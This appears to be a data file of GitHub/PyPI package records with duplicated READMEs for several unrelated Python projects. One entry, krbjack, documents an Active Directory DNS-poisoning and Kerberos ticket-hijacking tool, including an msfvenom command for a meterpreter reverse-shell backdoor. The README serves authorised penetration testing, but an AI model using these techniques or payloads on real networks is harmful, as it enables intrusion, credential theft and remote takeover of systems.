input_tensor = # Create an input tensor of 3D image for your model. Shape: (n_samples, n_channels, length, width, height)
# Note: input_tensor can be a batch tensor with several images! But Jingnan only tested the batch size of only 1.

# Construct the CAM object once, and then re-use it on many images:
cam = GradCAM(model=model, target_layers=target_layers, use_cuda=args.use_cuda)

# You can also use it within a with statement, to make sure it is freed,
# In case you need to re-create it inside an outer loop:
# with GradCAM(model=model, target_layers=target_layers, use_cuda=args.use_cuda) as cam:
#   ...

# We have to specify the target we want to generate
# the Class Activation Maps for.
# If targets is None, the highest scoring category
# will be used for every image in the batch.
# Here we use ClassifierOutputTarget, but you can define your own custom targets
# That are, for example, combinations of categories, or specific outputs in a non standard model.

targets = [ClassifierOutputTarget(281)]  # 281 could be replace by 0 or 1 for two-class classification.

# You can also pass aug_smooth=True and eigen_smooth=True, to apply smoothing.
cam_img = cam(input_tensor=input_tensor, targets=targets)  # output shape: (n_samples, length, width, height)

# In this example grayscale_cam has only one image in the batch:
cam_img = cam_img[0]  # output numpy array shape: (length, width, height)

# Then you can save the array as .mha file and visualize it in MeVisLab like the following figure.
```


----------

If this repository helps you in anyway, show your love ❤️ by putting a ⭐ on this project. 


",jingnan-jia/medcam3d
perspective-parquet,https://github.com/timkpaine/perspective-parquet,8,891,891,"# perspective-parquet
Parquet file editor in Jupyterlab, built with [Perspective](https://github.com/finos/perspective)

[![Build Status](https://github.com/timkpaine/perspective-parquet/workflows/Build%20Status/badge.svg?branch=main)](https://github.com/timkpaine/perspective-parquet/actions?query=workflow%3A%22Build+Status%22)
[![PyPI](https://img.shields.io/pypi/l/perspective-parquet.svg)](https://pypi.python.org/pypi/perspective-parquet)
[![PyPI](https://img.shields.io/pypi/v/perspective-parquet.svg)](https://pypi.python.org/pypi/perspective-parquet)
[![npm](https://img.shields.io/npm/v/perspective-parquet.svg)](https://www.npmjs.com/package/perspective-parquet)
[![Binder](https://mybinder.org/badge_logo.svg)](https://mybinder.org/v2/gh/timkpaine/perspective-parquet/main?urlpath=lab)

![](https://raw.githubusercontent.com/timkpaine/perspective-parquet/main/docs/img/demo.gif)
","# perspective-parquet
Parquet file editor in Jupyterlab, built with [Perspective](https://github.com/finos/perspective)

[![Build Status](https://github.com/timkpaine/perspective-parquet/workflows/Build%20Status/badge.svg?branch=main)](https://github.com/timkpaine/perspective-parquet/actions?query=workflow%3A%22Build+Status%22)
[![PyPI](https://img.shields.io/pypi/l/perspective-parquet.svg)](https://pypi.python.org/pypi/perspective-parquet)
[![PyPI](https://img.shields.io/pypi/v/perspective-parquet.svg)](https://pypi.python.org/pypi/perspective-parquet)
[![npm](https://img.shields.io/npm/v/perspective-parquet.svg)](https://www.npmjs.com/package/perspective-parquet)
[![Binder](https://mybinder.org/badge_logo.svg)](https://mybinder.org/v2/gh/timkpaine/perspective-parquet/main?urlpath=lab)

![](https://raw.githubusercontent.com/timkpaine/perspective-parquet/main/docs/img/demo.gif)
",timkpaine/perspective-parquet
huaweicloudsdkmsgsms,https://github.com/huaweicloud/huaweicloud-sdk-python-v3,1,115,115,"See detailed information in [huaweicloud-sdk-python-v3](https://github.com/huaweicloud/huaweicloud-sdk-python-v3).
","See detailed information in [huaweicloud-sdk-python-v3](https://github.com/huaweicloud/huaweicloud-sdk-python-v3).
",huaweicloud/huaweicloud-sdk-python-v3
krbjack,https://github.com/almandin/krbjack,4,8899,8766,"# KRBJack

This tool can be used to abuse the dangerous `ZONE_UPDATE_UNSECURE` flag on DNS main domain zone in an Active Directory. This flag when set allows anyone unauthenticated to update, add and remove DNS records anonymously. It is quite common to see it during engagements as it is required to get some DHCP servers working with non-windows based systems, to get them update their own records. Even though this flag is extremely dangerous, I've never seen any tool to ease its exploitation. What I wanted to build is a mean to perform Man-in-the-Middle based on this dangerous flag, grab credentials and use them directly to own systems or the entire active directory services (though multiple tools can be used together to perform ntlm relay for example).

The benefit from using this technique of man in the middle is that it goes through routers, as the ""official"" DNS records are poisonned. If proper routing is set (and if no firewall rule prevents it), someone on another broadcast domain can be targeted (unlike ARP poisoning which only works on you broadcast domain).

Moreover I made the choice to perform fully functionnal AP_REQ hijacking to allow compromission of systems using kerberos instead of NetNTLM.

# Install

```bash
sudo python -m pip install krbjack
```

You do need to install the tool with root rights as it will need to be runnable by root to listen to privileged ports. Alternatively you can have fun with virtual envs. Alternatively you can download this repo and use `poetry` to install it.

# Usage

`sudo krbjack --target-name <targetNBTName> [--target-ip <targetIP>] --domain <domainName> --dc-ip <domainControlerIpAddress> --ports <port1,port2,port3,...> --executable <executable.exe>`

- `--target-name` : The netbios name of your target, the one you will impersonate, the one you want will pwn if successful. Example : `winserv2`;
- `--target-ip` : You might want to specify the IP address of your target. The alternative is to let this tool query the DNS to get its IP addresses. A quick naive scan is performed to choose one IP from the ones returned by the DNS though this method is flawed. Example: `192.168.42.20`;
- `--domain` : The domain name to which your target is joined. Example : `windomain.local`;
- `--dc-ip` : The IP address of the domain controller you will be poisoning DNS records. Can be any domain controller as the DNS zones will be replicated automatically. Example : `192.168.42.10`;
- `--ports` : A list of TCP ports which will be open on your attacker's machine to forward traffic to your target. This list is *very* important because if you omit one port which is open on the legitimate service (your target), clients wont be able to access it during the time of the attack. Setting this list of ports correctly is the key to perform the attack without doing to much of a mess in the network. Example : `135,139,445,80,443,8080`
- `--executable <executable.exe>` : The path to an executable on your attacker's machine. This executable will be uploaded and executed psexec-style on your target if the attack succeeds. Example : `/home/almandin/metx64revtcp.exe`.

    The executable you provide can be either a ""standard"" executable, or a windows service executable (better). If it is a ""standard"" executable, windows will kill it when running after a few seconds if it has not ended already, because as it is run as a service, Windows expects it to do proper signaling (behave as a true service). Though it still works, you might want to migrate quickly your meterpreter when the session is established.

    If you use a windows service executable, you're good to go, nothing to add here. You can generate such executables with msfvenom with the `exe-service` format:

        msfvenom -f exe-service -o backdoor.exe -p windows/x64/meterpreter/reverse_tcp LHOST=X LPORT=Y

**Additionnal flags :**

- `--check` : Used to performs no attack at all, just to check if the DNS zone is vulnerable.
- `--no-poison` : Can  be used to set all the mess in place but prevent DNS poisoning from being done. Just in case you managed to poison DNS yourself or if you found another way to point clients to you instead of the legitimate service.

## What are the requirements for this to work ?

First you need to check if the domain you are testing is vulnerable to the main misconfiguration : `ZONE_UPDATE_UNSECURE`. For this you can use external tools such as PingCastle, or let Krbjack do it with the addition of the `--check` flag on the command line.

At the moment this tool only works for systems that do not require SMB Signing. This is a current limitation as the exploited service is SMB for the time being. It means that you cannot target domain controllers most of the time as they have been requiring SMB signing by default for a long time.

## What are the risks of using this tool ?

Just like any other man in the middle attack, you will be receiving connections from any client requesting an access to any service of your target. This means that it can be CPU intensive if the targetted system is highly used.

Moreover, this tool performs live packet inspection on fully-connected TCP streams. Clients DO connect to you before being redirected to the legitimate service. Because of how Kerberos works, it will block some specific connections from behaving correctly as service tickets will be used on the clients' behalf, having the effect to be ""consumed"" (kerberos tickets cannot be replayed). It means that this tool will make network connection a bit unreliable for every new connection with an interesting AP_REQ in it (AP_REQ for SMB services to our target). HOWEVER, a whitelist is in place to prevent complete blocking of connections. If a client comes several times, only the first AP_REQ will be hijacked. Either it was successful and you pwned your target, or it was not and the client is added to the whitelist to prevent it from being checked again and blocked multiple times. Moreover, other services will still be served and be working correctly thanks to proper forwarding ""à la"" ssh port forwarding, thoug it might induce lag and delays because of network packets processing on the attacker machine.

## How does it works ?

First the man in the middle is put in place by changing DNS records attached to your target. It abuses the DNS misconfiguration to say `""hey, now myLegitService is now at <attacker's IP>""`. This way, everyone trying to reach the legitimate service will now reach to you instead. The DNS records are also kept poisoned by checking regularly if they have been set back to the right ones (a server or computer might have reboot, or updated a record while the attack was beeing performed).

In the meantime, the tool starts multithreaded TCP servers to mimick your target TCP services. It starts to serve SMB, HTTP, whatever service you state in the command line. It does so just like an SSH port forwarding : when you reach to the attacker's started services, krbjack initiates connection to the true legitimate service on the same port, and forwards every packet from the legitimate client, to the legitimate service. This way, a full man in the middle is performed both ways, this prevents traffic from being completely blocked.

When the man in the middle is performed, every single packet is inspected to find kerberos AP_REQ packets (containing what's necessary to authenticate to services) or other authenticating packets. When such a packet/ticket is found to be sent from a client, it is used in real time to connect to the legitimate service *on behalf* of the legitimate client. This way krbjack can perform authenticated stuff to the legitimate service. At the moment only SMB is supported, meaning that krbjack performs authenticated SMB actions at this time of the attack workflow. It then uses this authenticated channel to check if the legitimate client was an administrator (tries to list directory ADMIN$ - C:\Windows). If it happens that the client was an administrator, man in the middle is stopped, DNS records are fixed ant it then uses the very same authenticated channel to perform a full psexec.

Krbjack also modifies packets on-the-fly depending on the protocol to remove security flags when possible (SMB flags ""signing required"", ""supported"" etc... though it is quite naive for the time being).

# Acknowledgements

Project Zero :
- https://googleprojectzero.blogspot.com/2021/10/using-kerberos-for-authentication-relay.html
- https://googleprojectzero.blogspot.com/2021/10/windows-exploitation-tricks-relaying.html

Impacket :
- https://github.com/fortra/impacket

# Disclaimer

This tooling is made only for legal penetration testing and not for any other use. I am not responsible for how it is used by anyone or if it is used to penetrate systems without permission or proper contractual agreements. It is provided as is and without warranty of any sort.","# KRBJack

This tool can be used to abuse the dangerous `ZONE_UPDATE_UNSECURE` flag on DNS main domain zone in an Active Directory. This flag when set allows anyone unauthenticated to update, add and remove DNS records anonymously. It is quite common to see it during engagements as it is required to get some DHCP servers working with non-windows based systems, to get them update their own records. Even though this flag is extremely dangerous, I've never seen any tool to ease its exploitation. What I wanted to build is a mean to perform Man-in-the-Middle based on this dangerous flag, grab credentials and use them directly to own systems or the entire active directory services (though multiple tools can be used together to perform ntlm relay for example).

The benefit from using this technique of man in the middle is that it goes through routers, as the ""official"" DNS records are poisonned. If proper routing is set (and if no firewall rule prevents it), someone on another broadcast domain can be targeted (unlike ARP poisoning which only works on you broadcast domain).

Moreover I made the choice to perform fully functionnal AP_REQ hijacking to allow compromission of systems using kerberos instead of NetNTLM.

# Install

```bash
sudo python -m pip install krbjack
```

You do need to install the tool with root rights as it will need to be runnable by root to listen to privileged ports. Alternatively you can have fun with virtual envs. Alternatively you can download this repo and use `poetry` to install it.

# Usage

`sudo krbjack --target-name  [--target-ip ] --domain  --dc-ip  --ports  --executable `

- `--target-name` : The netbios name of your target, the one you will impersonate, the one you want will pwn if successful. Example : `winserv2`;
- `--target-ip` : You might want to specify the IP address of your target. The alternative is to let this tool query the DNS to get its IP addresses. A quick naive scan is performed to choose one IP from the ones returned by the DNS though this method is flawed. Example: `192.168.42.20`;
- `--domain` : The domain name to which your target is joined. Example : `windomain.local`;
- `--dc-ip` : The IP address of the domain controller you will be poisoning DNS records. Can be any domain controller as the DNS zones will be replicated automatically. Example : `192.168.42.10`;
- `--ports` : A list of TCP ports which will be open on your attacker's machine to forward traffic to your target. This list is *very* important because if you omit one port which is open on the legitimate service (your target), clients wont be able to access it during the time of the attack. Setting this list of ports correctly is the key to perform the attack without doing to much of a mess in the network. Example : `135,139,445,80,443,8080`
- `--executable ` : The path to an executable on your attacker's machine. This executable will be uploaded and executed psexec-style on your target if the attack succeeds. Example : `/home/almandin/metx64revtcp.exe`.

    The executable you provide can be either a ""standard"" executable, or a windows service executable (better). If it is a ""standard"" executable, windows will kill it when running after a few seconds if it has not ended already, because as it is run as a service, Windows expects it to do proper signaling (behave as a true service). Though it still works, you might want to migrate quickly your meterpreter when the session is established.

    If you use a windows service executable, you're good to go, nothing to add here. You can generate such executables with msfvenom with the `exe-service` format:

        msfvenom -f exe-service -o backdoor.exe -p windows/x64/meterpreter/reverse_tcp LHOST=X LPORT=Y

**Additionnal flags :**

- `--check` : Used to performs no attack at all, just to check if the DNS zone is vulnerable.
- `--no-poison` : Can  be used to set all the mess in place but prevent DNS poisoning from being done. Just in case you managed to poison DNS yourself or if you found another way to point clients to you instead of the legitimate service.

## What are the requirements for this to work ?

First you need to check if the domain you are testing is vulnerable to the main misconfiguration : `ZONE_UPDATE_UNSECURE`. For this you can use external tools such as PingCastle, or let Krbjack do it with the addition of the `--check` flag on the command line.

At the moment this tool only works for systems that do not require SMB Signing. This is a current limitation as the exploited service is SMB for the time being. It means that you cannot target domain controllers most of the time as they have been requiring SMB signing by default for a long time.

## What are the risks of using this tool ?

Just like any other man in the middle attack, you will be receiving connections from any client requesting an access to any service of your target. This means that it can be CPU intensive if the targetted system is highly used.

Moreover, this tool performs live packet inspection on fully-connected TCP streams. Clients DO connect to you before being redirected to the legitimate service. Because of how Kerberos works, it will block some specific connections from behaving correctly as service tickets will be used on the clients' behalf, having the effect to be ""consumed"" (kerberos tickets cannot be replayed). It means that this tool will make network connection a bit unreliable for every new connection with an interesting AP_REQ in it (AP_REQ for SMB services to our target). HOWEVER, a whitelist is in place to prevent complete blocking of connections. If a client comes several times, only the first AP_REQ will be hijacked. Either it was successful and you pwned your target, or it was not and the client is added to the whitelist to prevent it from being checked again and blocked multiple times. Moreover, other services will still be served and be working correctly thanks to proper forwarding ""à la"" ssh port forwarding, thoug it might induce lag and delays because of network packets processing on the attacker machine.

## How does it works ?

First the man in the middle is put in place by changing DNS records attached to your target. It abuses the DNS misconfiguration to say `""hey, now myLegitService is now at ""`. This way, everyone trying to reach the legitimate service will now reach to you instead. The DNS records are also kept poisoned by checking regularly if they have been set back to the right ones (a server or computer might have reboot, or updated a record while the attack was beeing performed).

In the meantime, the tool starts multithreaded TCP servers to mimick your target TCP services. It starts to serve SMB, HTTP, whatever service you state in the command line. It does so just like an SSH port forwarding : when you reach to the attacker's started services, krbjack initiates connection to the true legitimate service on the same port, and forwards every packet from the legitimate client, to the legitimate service. This way, a full man in the middle is performed both ways, this prevents traffic from being completely blocked.

When the man in the middle is performed, every single packet is inspected to find kerberos AP_REQ packets (containing what's necessary to authenticate to services) or other authenticating packets. When such a packet/ticket is found to be sent from a client, it is used in real time to connect to the legitimate service *on behalf* of the legitimate client. This way krbjack can perform authenticated stuff to the legitimate service. At the moment only SMB is supported, meaning that krbjack performs authenticated SMB actions at this time of the attack workflow. It then uses this authenticated channel to check if the legitimate client was an administrator (tries to list directory ADMIN$ - C:\Windows). If it happens that the client was an administrator, man in the middle is stopped, DNS records are fixed ant it then uses the very same authenticated channel to perform a full psexec.

Krbjack also modifies packets on-the-fly depending on the protocol to remove security flags when possible (SMB flags ""signing required"", ""supported"" etc... though it is quite naive for the time being).

# Acknowledgements

Project Zero :
- https://googleprojectzero.blogspot.com/2021/10/using-kerberos-for-authentication-relay.html
- https://googleprojectzero.blogspot.com/2021/10/windows-exploitation-tricks-relaying.html

Impacket :
- https://github.com/fortra/impacket

# Disclaimer

This tooling is made only for legal penetration testing and not for any other use. I am not responsible for how it is used by anyone or if it is used to penetrate systems without permission or proper contractual agreements. It is provided as is and without warranty of any sort.",almandin/krbjack
pyfloat,https://github.com/sh1l0n/pyfloats,0,1094,1094,"## PyFloat Lib

Python Library for doing math operations with floats without lossing precission

## How to use

```
>> from pyfloat import PyFloat

>> PyFloat(2.1234e-12)
'0.0000000000021234'
>> PyFloat(-2.1234e+12)
'-2123400000000'
>> PyFloat(0.1452)
'0.1452'
>> PyFloat(PyFloat(152.455))
'152.455'
>> a = PyFloat(""123451.1234551230000000004444445551122000000011"")
>> b = PyFloat(-8123994.000002234100000001323400000001232112221)
>> a + b
'-8000542.8765471111000000008789554448890321122199'
>> a - b
'8247445.1234573571000000017678445551134321122221'
>> a * b
'-1002916186242.9543234169148643344158458369442274183843912848765430855693663896461975553234431'
>> a == b
'False'
>> a != b
'True'
>> a > b
'True'
>>> PyFloat(0.00239419391).round(10)
'0.0023941939'
>>> PyFloat(0.00239419391).round(7)
'0.0023942'
>>> PyFloat(-0.00239419391).round(7)
'-0.0023942'
>>> PyFloat(0.00239419391).round(4)
'0.0024'
>>> PyFloat(-1234.5678).abs()
'1234.5678'
>>> PyFloat(0.0000089778).truncate(8)
'0.00000897'
>>> PyFloat(-0.0000089778).truncate(8)
-0.00000897
```

## Test

```
python pytfloat_test.py
```
","## PyFloat Lib

Python Library for doing math operations with floats without lossing precission

## How to use

```
>> from pyfloat import PyFloat

>> PyFloat(2.1234e-12)
'0.0000000000021234'
>> PyFloat(-2.1234e+12)
'-2123400000000'
>> PyFloat(0.1452)
'0.1452'
>> PyFloat(PyFloat(152.455))
'152.455'
>> a = PyFloat(""123451.1234551230000000004444445551122000000011"")
>> b = PyFloat(-8123994.000002234100000001323400000001232112221)
>> a + b
'-8000542.8765471111000000008789554448890321122199'
>> a - b
'8247445.1234573571000000017678445551134321122221'
>> a * b
'-1002916186242.9543234169148643344158458369442274183843912848765430855693663896461975553234431'
>> a == b
'False'
>> a != b
'True'
>> a > b
'True'
>>> PyFloat(0.00239419391).round(10)
'0.0023941939'
>>> PyFloat(0.00239419391).round(7)
'0.0023942'
>>> PyFloat(-0.00239419391).round(7)
'-0.0023942'
>>> PyFloat(0.00239419391).round(4)
'0.0024'
>>> PyFloat(-1234.5678).abs()
'1234.5678'
>>> PyFloat(0.0000089778).truncate(8)
'0.00000897'
>>> PyFloat(-0.0000089778).truncate(8)
-0.00000897
```

## Test

```
python pytfloat_test.py
```
",sh1l0n/pyfloats
json-types,https://github.com/cj81499/json_types,6,364,364,"# json_types

[![PyPI - Version](https://img.shields.io/pypi/v/json_types.svg)](https://pypi.org/project/json_types)
[![PyPI - Python Version](https://img.shields.io/pypi/pyversions/json_types.svg)](https://pypi.org/project/json_types)

Type definitions and utilities for working with JSON in Python

-----

## Installation

```console
pip install json_types
```

","# json_types

[![PyPI - Version](https://img.shields.io/pypi/v/json_types.svg)](https://pypi.org/project/json_types)
[![PyPI - Python Version](https://img.shields.io/pypi/pyversions/json_types.svg)](https://pypi.org/project/json_types)

Type definitions and utilities for working with JSON in Python

-----

## Installation

```console
pip install json_types
```

",cj81499/json_types
fileaccess,https://github.com/node0/Fileaccess,1,2580,2580,"# Fileaccess Utility Class

## Introduction
`Fileaccess` is a utility class for safely dealing with files. This class can be used to read, write, or append to a file, as well as create a file or directory.

## Usage
### Reading a File
To read a file, use the `with` statement and specify the file name and mode as the `Fileaccess` class parameters. Here's an example:

```python
with Fileaccess(""filename.txt"", ""r"") as file:
    for line in file:
        print(line)
```

### Writing to a File
To write to a file, use the `with` statement and specify the file name and mode as the `Fileaccess` class parameters. Here's an example:

```python
with Fileaccess(""filename.txt"", ""w"") as file:
    file.write(""Hello World"")
```

### Appending to a File
To append to a file, use the `with` statement and specify the file name and mode as the `Fileaccess` class parameters. Here's an example:

```python
with Fileaccess(""filename.txt"", ""a"") as file:
    file.write(""Hello World"")
```

### Creating a File or Directory
To create a file or directory, use the `createFile` method of the `Fileaccess` class. Here's an example:

```python
Fileaccess.createFile(assetType=""f"", targetPath=""/path/to/file.txt"", fileContents=""File contents"")
```

In the above example, `assetType` can be either `""f""` to create a file or `""d""` to create a directory. The `targetPath` parameter specifies the path where the file or directory will be created. The `fileContents` parameter is optional and can be used to specify the contents of the file.
  
Note: You do NOT need to first create the directory path for a file if the directory path doesn't exist (all you need are access permissions for the user python is running as). The full directory path will automatically be create for you simply by you providing a full file path.
  

## File Access Modes
The `mode` parameter in the `Fileaccess` class specifies the file access mode. Here's a table of the available modes:

| Mode | Meaning |
| --- | --- |
| `r` | Open for reading (default) |
| `w` | Open for writing, truncating the file first |
| `x` | Open for exclusive creation, failing if the file already exists |
| `a` | Open for writing, appending to the end of file if it exists |
| `b` | Binary mode |
| `t` | Text mode (default) |
| `+` | Open for updating (reading and writing) |

## Error Handling
If an error occurs while using the `Fileaccess` class, it will be caught and printed to the console. This can be useful for debugging purposes.

## License
This code is licensed under the MIT License. See the `LICENSE` file for more information.
","# Fileaccess Utility Class

## Introduction
`Fileaccess` is a utility class for safely dealing with files. This class can be used to read, write, or append to a file, as well as create a file or directory.

## Usage
### Reading a File
To read a file, use the `with` statement and specify the file name and mode as the `Fileaccess` class parameters. Here's an example:

```python
with Fileaccess(""filename.txt"", ""r"") as file:
    for line in file:
        print(line)
```

### Writing to a File
To write to a file, use the `with` statement and specify the file name and mode as the `Fileaccess` class parameters. Here's an example:

```python
with Fileaccess(""filename.txt"", ""w"") as file:
    file.write(""Hello World"")
```

### Appending to a File
To append to a file, use the `with` statement and specify the file name and mode as the `Fileaccess` class parameters. Here's an example:

```python
with Fileaccess(""filename.txt"", ""a"") as file:
    file.write(""Hello World"")
```

### Creating a File or Directory
To create a file or directory, use the `createFile` method of the `Fileaccess` class. Here's an example:

```python
Fileaccess.createFile(assetType=""f"", targetPath=""/path/to/file.txt"", fileContents=""File contents"")
```

In the above example, `assetType` can be either `""f""` to create a file or `""d""` to create a directory. The `targetPath` parameter specifies the path where the file or directory will be created. The `fileContents` parameter is optional and can be used to specify the contents of the file.
  
Note: You do NOT need to first create the directory path for a file if the directory path doesn't exist (all you need are access permissions for the user python is running as). The full directory path will automatically be create for you simply by you providing a full file path.
  

## File Access Modes
The `mode` parameter in the `Fileaccess` class specifies the file access mode. Here's a table of the available modes:

| Mode | Meaning |
| --- | --- |
| `r` | Open for reading (default) |
| `w` | Open for writing, truncating the file first |
| `x` | Open for exclusive creation, failing if the file already exists |
| `a` | Open for writing, appending to the end of file if it exists |
| `b` | Binary mode |
| `t` | Text mode (default) |
| `+` | Open for updating (reading and writing) |

## Error Handling
If an error occurs while using the `Fileaccess` class, it will be caught and printed to the console. This can be useful for debugging purposes.

## License
This code is licensed under the MIT License. See the `LICENSE` file for more information.
",node0/fileaccess
imdbtraktsyncer,https://github.com/RileyXX/IMDb-Trakt-Syncer,3,5290,5286,"
# IMDb-Trakt-Syncer
This script will sync user ratings for Movies and TV Shows both ways between Trakt and IMDb. Currently season and episode ratings are not supported. Ratings already set will not be overwritten. This script should work on an OS where python is supported.
## Install Instructions:
1. Install [Python](https://www.python.org/downloads/) and [Google Chrome](https://www.google.com/chrome/). _If these are already installed on your machine you can ignore this step. Please note this script does not effect Chrome in anyway it is simply required in order for chromedriver to work._
2. Run `python -m pip install IMDbTraktSyncer` in command line.
3. Login to [Trakt](https://trakt.tv/oauth/applications) and create a new API application. We will name it `IMDbTraktSyncer`. In the Redirect uri field enter `urn:ietf:wg:oauth:2.0:oob` then Save. 
4. Run the script by calling `IMDbTraktSyncer` in command line. Follow the prompts on first run. It will ask you to fill in your Trakt client id and client secret from step 3. It will also ask you to enter your IMDb username and password. Please note that these details are saved insecurely as credentials.txt in the same folder as the script. Recommended to change your password to something unique beforehand.
5. Done, setup complete. The script will continue to run and sync your ratings. This may take some time, you can follow its progress in the command line.

## Run:
`IMDbTraktSyncer` in command line.

## Update:
`python -m pip install IMDbTraktSyncer --upgrade` in command line.

## Uninstall:
`python -m pip uninstall IMDbTraktSyncer` in command line.

## Alternative manual install method:
1. Download the latest .zip from the [releases page](https://github.com/RileyXX/IMDb-Trakt-Syncer/releases) and move it to the file directory of your choice.
2. Open terminal and navigate to folder where `IMDbTraktSyncer.py` is located. Run `IMDbTraktSyncer.py` in terminal. Follow the prompts on first run. It will ask you to fill in your Trakt client id and client secret from step 3. It will also ask you to enter your IMDb username and password. Please note that these details are saved insecurely as credentials.txt in the same folder as the script. Recommended to change your password to something unique beforehand.
3. Done. The script will continue to run and sync your ratings. This may take some time, you can follow its progress in the command line.

## Troubleshooting, known issues, workarounds & future outlook:
* IMDb may require a captcha on login. If you see ""Not signed in"" appear in the script then the script will fail and the captcha is likely to be the cause. To fix this, navigate to IMDb website in your browser, preferably Chrome and from the same computer. If logged in, logout, and log back in. It may ask you to fill in a captch, complete it and finish logging in. After logging in succesfully on your browser run the script again and it should work. You may need to repeat this step once or twice if it still gives you issues. I'm looking into adding a captcha solver into the script to solve this problem, but it is currently not implemented. 
* If you see an error about having the incorrect version of Chrome driver. Uninstall it by running `python -m pip uninstall chromedriver-py` in command line. In your Chrome browser navigate to Settings > About Chrome and check your version (112... or 111 etc). This would indicate you are on Chrome version 112. Navigate to [chromedriver-py releases page](https://pypi.org/project/chromedriver-py/#history) and find the latest version that is the same Chrome version (112) already on your machine. Copy the version number you need. Then in command line run `python -m pip install chromedriver-py==VERSION_NUMBER`. Replace `VERSION_NUMBER` with the version you copied and press enter. This will install the correct chromedriver version. Run the script again and it should work.
* Due to IMDb's lack of API and lack of rating import ability, this script uses a rather unconventional method that mimics using a web browser to set ratings on IMDB. So there are many points of failure that could arise. I will try my best to keep the script updated as best possible.
* If any of your details change, passwords, logins, api keys etc, just delete credentials.txt and that will reset the script. It will prompt you to enter your new details on next run.

## Screenshot:
![Demo](https://i.imgur.com/uydTDcg.png)


## Sponsorships, Donations and Custom Projects:
Like my scripts? Become a [sponsor](https://github.com/sponsors/RileyXX) and support my projects! See below for other donation options. Need help with a project? Open an issue and I will try my best to help! For other inquiries and custom projects contact me on [Twitter](https://twitter.com/RileyxBell).

#### More donation options:
- Cashapp: `$rileyxx`
- Venmo: `@rileyxx`
- Bitcoin: `bc1qrjevwqv49z8y77len3azqfghxrjmrjvhy5zqau`
- Amazon Wishlist: [Link ↗](https://www.amazon.com/hz/wishlist/ls/WURF5NWZ843U)

## Also posted on:
* [Reddit](https://www.reddit.com/r/trakt/comments/132heo0/imdb_trakt_rating_syncer_tool_sync_both_ways/)

<br>

[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
","
# IMDb-Trakt-Syncer
This script will sync user ratings for Movies and TV Shows both ways between Trakt and IMDb. Currently season and episode ratings are not supported. Ratings already set will not be overwritten. This script should work on an OS where python is supported.
## Install Instructions:
1. Install [Python](https://www.python.org/downloads/) and [Google Chrome](https://www.google.com/chrome/). _If these are already installed on your machine you can ignore this step. Please note this script does not effect Chrome in anyway it is simply required in order for chromedriver to work._
2. Run `python -m pip install IMDbTraktSyncer` in command line.
3. Login to [Trakt](https://trakt.tv/oauth/applications) and create a new API application. We will name it `IMDbTraktSyncer`. In the Redirect uri field enter `urn:ietf:wg:oauth:2.0:oob` then Save. 
4. Run the script by calling `IMDbTraktSyncer` in command line. Follow the prompts on first run. It will ask you to fill in your Trakt client id and client secret from step 3. It will also ask you to enter your IMDb username and password. Please note that these details are saved insecurely as credentials.txt in the same folder as the script. Recommended to change your password to something unique beforehand.
5. Done, setup complete. The script will continue to run and sync your ratings. This may take some time, you can follow its progress in the command line.

## Run:
`IMDbTraktSyncer` in command line.

## Update:
`python -m pip install IMDbTraktSyncer --upgrade` in command line.

## Uninstall:
`python -m pip uninstall IMDbTraktSyncer` in command line.

## Alternative manual install method:
1. Download the latest .zip from the [releases page](https://github.com/RileyXX/IMDb-Trakt-Syncer/releases) and move it to the file directory of your choice.
2. Open terminal and navigate to folder where `IMDbTraktSyncer.py` is located. Run `IMDbTraktSyncer.py` in terminal. Follow the prompts on first run. It will ask you to fill in your Trakt client id and client secret from step 3. It will also ask you to enter your IMDb username and password. Please note that these details are saved insecurely as credentials.txt in the same folder as the script. Recommended to change your password to something unique beforehand.
3. Done. The script will continue to run and sync your ratings. This may take some time, you can follow its progress in the command line.

## Troubleshooting, known issues, workarounds & future outlook:
* IMDb may require a captcha on login. If you see ""Not signed in"" appear in the script then the script will fail and the captcha is likely to be the cause. To fix this, navigate to IMDb website in your browser, preferably Chrome and from the same computer. If logged in, logout, and log back in. It may ask you to fill in a captch, complete it and finish logging in. After logging in succesfully on your browser run the script again and it should work. You may need to repeat this step once or twice if it still gives you issues. I'm looking into adding a captcha solver into the script to solve this problem, but it is currently not implemented. 
* If you see an error about having the incorrect version of Chrome driver. Uninstall it by running `python -m pip uninstall chromedriver-py` in command line. In your Chrome browser navigate to Settings > About Chrome and check your version (112... or 111 etc). This would indicate you are on Chrome version 112. Navigate to [chromedriver-py releases page](https://pypi.org/project/chromedriver-py/#history) and find the latest version that is the same Chrome version (112) already on your machine. Copy the version number you need. Then in command line run `python -m pip install chromedriver-py==VERSION_NUMBER`. Replace `VERSION_NUMBER` with the version you copied and press enter. This will install the correct chromedriver version. Run the script again and it should work.
* Due to IMDb's lack of API and lack of rating import ability, this script uses a rather unconventional method that mimics using a web browser to set ratings on IMDB. So there are many points of failure that could arise. I will try my best to keep the script updated as best possible.
* If any of your details change, passwords, logins, api keys etc, just delete credentials.txt and that will reset the script. It will prompt you to enter your new details on next run.

## Screenshot:
![Demo](https://i.imgur.com/uydTDcg.png)


## Sponsorships, Donations and Custom Projects:
Like my scripts? Become a [sponsor](https://github.com/sponsors/RileyXX) and support my projects! See below for other donation options. Need help with a project? Open an issue and I will try my best to help! For other inquiries and custom projects contact me on [Twitter](https://twitter.com/RileyxBell).

#### More donation options:
- Cashapp: `$rileyxx`
- Venmo: `@rileyxx`
- Bitcoin: `bc1qrjevwqv49z8y77len3azqfghxrjmrjvhy5zqau`
- Amazon Wishlist: [Link ↗](https://www.amazon.com/hz/wishlist/ls/WURF5NWZ843U)

## Also posted on:
* [Reddit](https://www.reddit.com/r/trakt/comments/132heo0/imdb_trakt_rating_syncer_tool_sync_both_ways/)



[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
",rileyxx/imdb-trakt-syncer
ccache-download-redis,https://github.com/berlin4apk/action-ccache-download-upload-redis,4,3170,3170,"# ccache-upload-redis / ccache-download-redis GitHub Action

An GitHub Action for using ccache-upload-redis / ccache-download-redis
to uploads / downloads the contents of the local ccache cache from a Redis remote storage.

## Usage

- 
- 


```yaml
name: Test ccache-download-upload-redis
on:
  workflow_dispatch:
jobs:
  # Label of the container job
  container-job:
    # Containers must run in Linux based operating systems
    runs-on: ubuntu-latest
    # Service containers to run with `container-job`
    services:
      # Label used to access the service container
      redis:
        # Docker Hub image
        image: redis:7.0.10-alpine3.17
        # Set health checks to wait until redis has started
        options: >-
          --interactive
          --hostname redis
          --add-host=host.docker.internal:host-gateway
          --health-cmd ""redis-cli ping""
          --health-interval 10s
          --health-timeout 5s
          --health-retries 5
          --restart always
        ports:
